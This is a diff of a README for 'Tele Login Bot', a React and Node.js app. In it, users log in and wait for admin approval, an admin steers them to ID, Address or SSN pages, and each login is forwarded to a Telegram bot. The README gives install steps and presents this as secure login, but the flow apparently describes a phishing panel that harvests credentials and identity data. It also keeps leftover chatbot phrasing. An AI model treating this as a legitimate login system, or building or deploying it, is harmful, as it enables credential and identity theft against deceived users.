@@ -1,24 +1,23 @@
-```markdown
 # Tele Login Bot
 
-## Brief Description
-Tele Login Bot is a React.js-based application that allows users to log in and wait for approval from the admin. After approval, the admin can choose to direct the user to the ID, Address, or SSN page. The user's login data is sent to a Telegram bot using `node-telegram-bot-api` in the Node.js backend.
+## Short Description
+Tele Login Bot is a React.js-based application that allows users to log in, then wait for approval from the admin. Once approved, the admin can choose to direct the user to the ID, Address, or SSN page. The login data is sent to a Telegram bot using the `node-telegram-bot-api` on the Node.js backend.
 
 ## Key Features
 - Secure user login process.
-- A loading page that shows the approval status from the admin.
-- Admin can choose to redirect users to the ID, Address, or SSN page.
-- User login data is sent to a Telegram bot using `node-telegram-bot-api`.
+- A loading page showing the approval status from the admin.
+- Admin can choose to direct the user to the ID, Address, or SSN page.
+- User login data is sent to the Telegram bot using the `node-telegram-bot-api`.
 
 ## Technologies Used
-- **React.js**: Frontend framework for the application.
+- **React.js**: Framework for the frontend application.
 - **Node.js**: Backend server to manage the app flow and interact with the Telegram bot.
-- **axios**: Used to send HTTP requests to the backend.
-- **input-otp**: OTP input for the application.
-- **react-router-dom**: For routing between pages in the frontend.
-- **node-telegram-bot-api**: For sending data to the Telegram bot.
+- **axios**: For sending HTTP requests to the backend.
+- **input-otp**: For OTP input on the application.
+- **react-router-dom**: For routing between pages on the frontend.
+- **node-telegram-bot-api**: To send data to the Telegram bot.
 
-Here are the dependencies used in the project:
+The dependencies used in this project are as follows:
 ```json
 {
   "name": "web_6",
@@ -67,7 +66,7 @@ Here are the dependencies used in the project:
 ## Installation Instructions
 1. Clone this repository:
    ```bash
-   git clone https://github.com/username/repository.git
+   git clone https://github.com/adistianherlambang/Tele-Login-Bot.git
    ```
 2. Navigate to the project directory:
    ```bash
@@ -77,27 +76,28 @@ Here are the dependencies used in the project:
    ```bash
    npm install
    ```
-4. Update the backend URL in your code:
-   - Replace `http://localhost:1000/request-approval` with your actual backend URL.
-5. Run the application:
+4. Change the backend URL in the code:
+   - Replace `http://localhost:1000/` with your own backend URL.
+5. Start the application:
    ```bash
    npm run start
    ```
 
-## Usage
-1. After the installation is complete, open your browser and visit `http://localhost:3000` to view the app.
-2. Users can log in and wait for admin approval.
-3. Admin will be given options to direct the user to the ID, Address, or SSN page.
-4. The user login data will be sent to the Telegram bot for each successfully logged-in user.
+## How to Use
+1. After the installation is complete, open the browser and go to `http://localhost:3000` to see the application.
+2. The user can log in and wait for approval from the admin.
+3. The admin will have the option to direct the user to the ID, Address, or SSN page.
+4. The login data will be sent to the Telegram bot for each successful user login.
 
 ## Contribution
 This project is not open for contributions.
 
 ## License
-This project does not use any open license.
+This project does not use an open license.
 
 ## Contact or Additional Information
-- Email: [email@example.com](mailto:email@example.com)
-```
+- Email: [email@example.com](adistian59@gmail.com)
 
-Feel free to update the placeholders like `username/repository` and `email@example.com` with your actual information. Let me know if you need any further adjustments!
+---
+
+Let me know if you need further adjustments!
